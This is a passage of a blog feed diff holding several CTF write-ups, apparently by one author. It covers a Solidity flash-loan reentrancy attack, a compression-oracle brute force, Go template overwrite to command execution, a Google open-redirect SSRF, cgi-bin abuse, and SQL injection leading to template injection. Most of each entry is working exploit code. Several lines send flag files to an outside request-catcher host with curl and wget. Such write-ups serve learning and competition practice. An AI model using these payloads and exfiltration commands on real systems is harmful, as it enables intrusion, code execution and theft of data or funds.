+        <span class="n">owner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+        
+        <span class="k">emit</span> <span class="n">Donation</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">msg</span><span class="p">.</span><span class="n">value</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Users can withdraw funds from the vault
+</span>    <span class="k">function</span> <span class="n">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"You have no funds to withdraw"</span><span class="p">);</span>
+
+        <span class="kt">uint256</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">];</span>
+        <span class="n">balances</span><span class="p">[</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+        <span class="k">payable</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Pause contract (in case the glacier gets infiltrated)
+</span>    <span class="k">function</span> <span class="n">pause</span><span class="p">()</span> <span class="k">public</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">"You are not the owner of this contract"</span><span class="p">);</span>
+        <span class="n">paused</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Unpause contract (in case the glacier gets cleared)
+</span>    <span class="k">function</span> <span class="n">unpause</span><span class="p">()</span> <span class="k">public</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">,</span> <span class="s">"You are not the owner of this contract"</span><span class="p">);</span>
+        <span class="n">paused</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">flashLoan</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">public</span> <span class="n">notPaused</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">&gt;=</span> <span class="n">amount</span><span class="p">,</span> <span class="s">"Owner has insufficient funds"</span><span class="p">);</span>
+
+        <span class="kt">uint256</span> <span class="n">balanceBefore</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">;</span>
+
+        <span class="c1">//Do the flash loan
+</span>        <span class="n">reentrancyGuard</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="n">amount</span><span class="p">}(</span><span class="s">""</span><span class="p">);</span>
+        <span class="n">reentrancyGuard</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+        <span class="nb">require</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span> <span class="o">==</span> <span class="n">balanceBefore</span><span class="p">,</span> <span class="s">"Flash loan failed"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// ------------------ Utils to make your life easier ------------------
+</span>
+
+    <span class="c1">//Multicall for other contracts (saves gas)
+</span>    <span class="k">function</span> <span class="n">multicallOthers</span><span class="p">(</span><span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_targets</span><span class="p">,</span> <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span> 
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">_targets</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="n">_data</span><span class="p">.</span><span class="n">length</span><span class="p">,</span> <span class="s">"Arrays must be the same length"</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_targets</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">_targets</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nb">call</span><span class="p">(</span><span class="n">_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Transaction failed"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Multicall for this contract (saves gas)
+</span>    <span class="k">function</span> <span class="n">multicallThis</span><span class="p">(</span><span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span> <span class="k">payable</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">_data</span><span class="p">.</span><span class="n">length</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">_data</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+            <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">"Transaction failed"</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="c1">//Carve your personalized event into the ice
+</span>    <span class="k">function</span> <span class="n">emitEvent</span><span class="p">(</span><span class="kt">bytes</span> <span class="k">memory</span> <span class="n">_data</span><span class="p">)</span> <span class="k">public</span>
+    <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="o">!</span><span class="n">reentrancyGuard</span><span class="p">,</span> <span class="s">"Reentrancy guard is active"</span><span class="p">);</span>
+
+        <span class="k">emit</span> <span class="n">MyEvent</span><span class="p">(</span><span class="n">_data</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">import</span> <span class="s">"forge-std/Script.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"forge-std/console.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Atk</span> <span class="p">{</span>
+  <span class="n">ArcticVault</span> <span class="n">av</span><span class="p">;</span>
+  <span class="kt">bool</span> <span class="n">toggle</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+
+  <span class="k">function</span> <span class="n">run</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="n">av</span> <span class="o">=</span> <span class="n">ArcticVault</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">withdraw</span><span class="p">();</span>
+  <span class="p">}</span>
+
+  <span class="k">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">toggle</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+    <span class="n">toggle</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="mi">0</span> <span class="kc">ether</span><span class="p">);</span>
+    <span class="n">av</span><span class="p">.</span><span class="n">deposit</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">Hax</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+  <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+    <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">"PRIVATE_KEY"</span><span class="p">));</span>
+    <span class="n">Setup</span> <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xcC29E0ba11fA7fcBF65F58E7A59a46C1a3cBfEd3</span><span class="p">));</span>
+    <span class="n">ArcticVault</span> <span class="n">chall</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">TARGET</span><span class="p">();</span>
+
+    <span class="n">Atk</span> <span class="n">atk</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Atk</span><span class="p">();</span>
+    <span class="n">atk</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">chall</span><span class="p">));</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">gctf{Me55age_d0t_wh4t?}</code></p>
+
+<p>shafouz 2024/11/24</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2402]]></summary></entry><entry><title type="html">just a day at the breach - BlueHens 2024</title><link href="https://shafouz.github.io/2024/11/10/just-a-day-at-the-breach.html" rel="alternate" type="text/html" title="just a day at the breach - BlueHens 2024" /><published>2024-11-10T04:00:00+00:00</published><updated>2024-11-10T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/11/10/just-a-day-at-the-breach</id><content type="html" xml:base="https://shafouz.github.io/2024/11/10/just-a-day-at-the-breach.html"><![CDATA[<p>https://ctftime.org/event/2512</p>
+
+<h1 id="just-a-day-at-the-breach-web">just a day at the breach (web)</h1>
+
+<p>zlib compress challenge</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>The challenge gives a oracle that shows the message length.
+So we can guess every character and if the length changes thats the correct character.
+Example:
+<code class="language-plaintext highlighter-rouge">uu</code> -&gt; 67
+<code class="language-plaintext highlighter-rouge">ub</code> -&gt; 68</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="k">def</span> <span class="nf">guess_big</span><span class="p">(</span><span class="n">w</span><span class="p">):</span>
+    <span class="n">REMOTE</span> <span class="o">=</span> <span class="p">(</span>
+        <span class="s">"https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws/?payload="</span>
+        <span class="o">+</span> <span class="n">w</span>
+    <span class="p">)</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">w</span><span class="p">),</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"---"</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"udctf{"</span>
+<span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">:</span>
+        <span class="n">c</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+        <span class="n">j</span> <span class="o">=</span> <span class="n">guess_big</span><span class="p">((</span><span class="n">flag</span> <span class="o">+</span> <span class="n">c</span><span class="p">).</span><span class="nb">hex</span><span class="p">())[</span><span class="s">"sniffed"</span><span class="p">]</span>
+
+        <span class="k">if</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">68</span><span class="p">:</span>
+            <span class="nb">max</span> <span class="o">=</span> <span class="n">j</span>
+            <span class="n">flag</span> <span class="o">=</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">c</span>
+            <span class="k">break</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[12]: lab1.py:49: flag=</span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">udctf{huffm4n_br34ched_l3t5_go}</code></p>
+
+<p>shafouz 2024/11/10</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2512]]></summary></entry><entry><title type="html">sandevistan - Blue Water CTF 2024</title><link href="https://shafouz.github.io/2024/10/13/sandevistan.html" rel="alternate" type="text/html" title="sandevistan - Blue Water CTF 2024" /><published>2024-10-13T04:00:00+00:00</published><updated>2024-10-13T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/10/13/sandevistan</id><content type="html" xml:base="https://shafouz.github.io/2024/10/13/sandevistan.html"><![CDATA[<p>https://ctftime.org/event/2479</p>
+
+<h1 id="sandevistan-web">Sandevistan (Web)</h1>
+
+<p>Go web chall</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>You overwrite a template then you need to find some useful gadget on <code class="language-plaintext highlighter-rouge">user</code> or <code class="language-plaintext highlighter-rouge">cyberware</code> to get the flag.
+There is a healthcheck function that calls <code class="language-plaintext highlighter-rouge">/bin/true</code>.
+So the idea is to overwrite that with something.
+But that doesn’t work because the file will start with <code class="language-plaintext highlighter-rouge">ERROR ...</code> and not run.
+<code class="language-plaintext highlighter-rouge">NewError</code> plus <code class="language-plaintext highlighter-rouge">SerializeErrors</code> allows us to write to any offset in a file.
+So we just do that.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+
+<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://sandevistan.chal.perfect.blue:28418/"</span>
+
+<span class="c1"># create user
+</span><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
+    <span class="n">REMOTE</span> <span class="o">+</span> <span class="s">"user"</span><span class="p">,</span>
+    <span class="n">data</span><span class="o">=</span><span class="s">"username=xad"</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="nb">bin</span> <span class="o">=</span> <span class="p">(</span>
+    <span class="s">"""{{ .NewError "asdsadasd" "/bin/true" }}
+rs -&gt; {{ range $index, $value := .Errors }}{{ $index }} - {{ $value }}</span><span class="se">\n</span><span class="s">{{ end }}
+alize -&gt; {{ .SerializeErrors "#!/bin/bash</span><span class="se">\\</span><span class="s">ncurl https://lalalalalallalala.requestcatcher.com/ -d @/flag</span><span class="se">\\</span><span class="s">n" 0 0 }}
+thcheck -&gt;  {{ .UserHealthcheck }}"""</span>
+    <span class="o">+</span> <span class="s">" "</span> <span class="o">*</span> <span class="mi">2000</span>
+<span class="p">)</span>
+<span class="nb">bin</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="nb">bin</span><span class="p">)</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
+    <span class="n">REMOTE</span> <span class="o">+</span> <span class="s">"cyberware"</span><span class="p">,</span>
+    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/x-www-form-urlencoded"</span><span class="p">},</span>
+    <span class="n">data</span><span class="o">=</span><span class="sa">f</span><span class="s">"username=../tmpl/user.html&amp;name=</span><span class="si">{</span><span class="nb">bin</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
+<span class="p">)</span>
+
+<span class="c1"># get user, new template
+</span><span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span>
+    <span class="n">REMOTE</span> <span class="o">+</span> <span class="s">"user"</span><span class="p">,</span>
+    <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/x-www-form-urlencoded"</span><span class="p">},</span>
+    <span class="n">data</span><span class="o">=</span><span class="s">"username=xad"</span><span class="p">,</span>
+<span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">bwctf{YoU_kNoW_yOu_d1dnt_l0s3_Ur_53Lf-coNtR0L._LEt'5_start_at_the_r4inB0w}</code></p>
+
+<p>shafouz - 2024/10/13</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2479]]></summary></entry><entry><title type="html">surfing - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/surfing.html" rel="alternate" type="text/html" title="surfing - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/surfing</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/surfing.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
+
+<h1 id="surfing-web">surfing (web)</h1>
+
+<p>Google redirects</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>Very interesting challenge, basically you send an email on gmail to yourself to get the usg parameter.
+Then you can use google as a open-redirect.
+<code class="language-plaintext highlighter-rouge">#</code> at the end is needed for some reason.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote_plus</span><span class="p">,</span> <span class="n">quote</span>
+
+<span class="n">part2</span> <span class="o">=</span> <span class="s">"https://ca14-2804-1b3-8146-8451-d3ef-cb85-2b79-23d7.ngrok-free.app&amp;source=gmail&amp;ust=1722697936722000&amp;usg=AOvVaw3Djb1BbeFhNoc5_At0Cbfe#"</span>
+<span class="n">part2</span> <span class="o">=</span> <span class="n">quote_plus</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"http://google.com/url?q="</span> <span class="o">+</span> <span class="n">part2</span>
+
+<span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31595/get"</span>
+
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="sa">f</span><span class="s">'url=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+<span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:6: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+
+
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">TFCCTF{18fd102247cb73e9f9acaa42801ad03cf622ca1c3689e4969affcb128769d0bc}</code></p>
+
+<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">funny - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/funny.html" rel="alternate" type="text/html" title="funny - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/funny</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/funny.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
+
+<h1 id="funny-web">funny (web)</h1>
+
+<p>cgi-bin stuff</p>
+
+<h2 id="solution">Solution</h2>
+
+<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ScriptAlias</span> /<span class="n">cgi</span>-<span class="n">bin</span> /<span class="n">usr</span>/<span class="n">bin</span>
+</code></pre></div></div>
+<p>Allows us to execute any binary on the dir with http path.
+It took some trial and error to get it working, i wonder if you can solve it with awk</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">quote_plus</span>
+
+<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31311/"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"wget?--post-file+/flag.txt+https://lalalalalallalala.requestcatcher.com/"</span>
+<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"cgi-bin/</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+<span class="p">})</span>
+<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+<p><code class="language-plaintext highlighter-rouge">TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}</code></p>
+
+<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">flask destroyer - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/flask-destroyer.html" rel="alternate" type="text/html" title="flask destroyer - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/flask-destroyer</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/flask-destroyer.html"><![CDATA[<p>https://ctftime.org/event/2423</p>
+
+<h1 id="flask-destroyer-web">flask-destroyer (web)</h1>
+
+<p>flask sqli</p>
+
+<h2 id="solution">Solution</h2>
+
+<p>There is an sqli on login, and <code class="language-plaintext highlighter-rouge">secure_file_priv = ""</code>.
+So we can upload any file we want.</p>
+
+<p>There is just the problem that flask hotloading is off, so we cannot load new templates.</p>
+
+<p>The solution is crashing the worker so when it restarts it loads the new templates in.
+The intented way to crash the worker is abusing <code class="language-plaintext highlighter-rouge">strtok</code> from libc, <code class="language-plaintext highlighter-rouge">asdsad:asda:</code> segfaults it</p>
+
+<p>The full exploit then:</p>
+<ul>
+  <li>upload template</li>
+  <li>crash</li>
+  <li>get new template</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote_plus</span>
+
+<span class="c1"># REMOTE = "http://0.0.0.0:1337/"
+</span><span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:32006/"</span>
+
+<span class="k">def</span> <span class="nf">create_file</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'''" UNION SELECT '{{ dict.__base__.__subclasses__()[379]("cat $(find /tmp -type f)",shell=True,stdout=-1).communicate()[0] }}', '', '' into outfile '/destroyer/app/templates/a.html'-- '''</span>
+    <span class="n">login</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'username=1&amp;password=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">&amp;vibe=y'</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+        <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+    <span class="p">})</span>
+
+
+<span class="k">def</span> <span class="nf">crash</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'''" UNION SELECT 'this works', 'sdsadasd', 'bla:'-- '''</span>
+    <span class="n">login</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'username=1&amp;password=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">&amp;vibe=y'</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
+        <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
+        <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
+    <span class="p">})</span>
+
+<span class="k">def</span> <span class="nf">get</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">'''" OR 1=1-- '''</span>
+    <span class="n">login</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'username=1&amp;password=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">&amp;vibe=y'</span>
